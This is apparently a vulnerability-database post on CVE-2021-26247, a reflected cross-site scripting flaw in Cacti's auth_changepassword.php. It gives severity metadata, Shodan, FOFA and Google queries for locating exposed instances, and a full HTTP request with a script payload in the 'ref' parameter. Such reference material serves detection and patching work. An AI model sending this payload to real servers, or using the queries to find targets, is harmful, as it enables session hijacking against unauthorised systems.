---
layout: post
cve_id: CVE-2021-26247
title: Cacti - Cross-Site Scripting
pcap: true
pcap_path: /pcaps/2021/CVE-2021-26247.pcap
nuclei_url: https://github.com/packetinside/nuclei-templates/blob/main/http/cves/2021/CVE-2021-26247.yaml
snort2_rule: N/A
snort3_rule: N/A
author: dhiyaneshDK
severity: medium
impact: 'Successful exploitation of this vulnerability could allow an attacker to
  execute arbitrary JavaScript code in the context of the victim''s browser, leading
  to session hijacking, defacement, or theft of sensitive information.

  '
remediation: 'Apply the latest security patches or upgrade to a patched version of
  Cacti to mitigate this vulnerability.

  '
reference:
- https://www.cacti.net/info/changelog
- https://nvd.nist.gov/vuln/detail/CVE-2021-26247
- https://github.com/ARPSyndicate/cvemon
- https://github.com/ARPSyndicate/kenzer-templates
classification:
  cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:R/S:C/C:L/I:L/A:N
  cvss-score: 6.1
  cve-id: CVE-2021-26247
  cwe-id: CWE-79
  epss-score: 0.43776
  epss-percentile: 0.97406
  cpe: cpe:2.3:a:cacti:cacti:0.8.7g:*:*:*:*:*:*:*
metadata:
  max-request: 1
  vendor: cacti
  product: cacti
  shodan-query:
  - http.title:"login to cacti"
  - http.title:"cacti"
  - http.favicon.hash:"-1797138069"
  fofa-query:
  - icon_hash="-1797138069"
  - title="cacti"
  - title="login to cacti"
  google-query:
  - intitle:"cacti"
  - intitle:"login to cacti"
tags:
- cve
- cve2021
- cacti
- xss
- vuln
---

## üîç Vulnerability Description
Cacti contains a cross-site scripting vulnerability via "http://<CACTI_SERVER>/auth_changepassword.php?ref=<script>alert(1)</script>" which can successfully execute the JavaScript payload present in the "ref" URL parameter.

## üåê HTTP Request
```nohighlight
GET /auth_changepassword.php?ref=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert(document.domain)%3C%2Fscript%3E HTTP/1.1
Host: www.victim.com
User-Agent: Mozilla/5.0 (X11; Linux i686; rv:1.9.7.20) Gecko/ Firefox/9.0
Connection: close
Accept: */*
Accept-Language: en
Accept-Encoding: gzip
```

